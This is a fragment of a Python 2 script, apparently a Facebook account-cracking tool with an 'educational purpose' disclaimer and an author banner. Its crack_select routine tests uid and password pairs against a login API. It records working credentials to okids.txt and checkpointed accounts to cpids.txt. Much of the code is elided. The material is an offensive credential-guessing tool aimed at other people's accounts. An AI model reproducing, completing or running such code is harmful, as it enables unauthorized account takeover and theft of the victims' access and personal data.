#Script Given By Abdul Mateen
#Script Is Given For Educational Purpose
#Script Edited By @Mateen
#Utf-8 python 
...
logo = """
 ...
 /033[1;92m _  _                     _ 
 | M__A ___T ___E__ E___N __| |
 |  _ V _) -_) _` |
 |__Z\_A_,\ï/\_B__\__,_|
                                      
\n\033[0m-----------------------------------------------
\033[1;92mAuthor \033[1;93m: Abdul-Mateen / Zaib rajpoot
\033[1;92mFb \033[1;93m: AbdulMateen / Zaibest Rajpoot
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://www.youtube.com/hanel/Tlbba_GA/')
        main()
    else:
        print ''
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[Mêtoo-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[ZAIB-OK] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
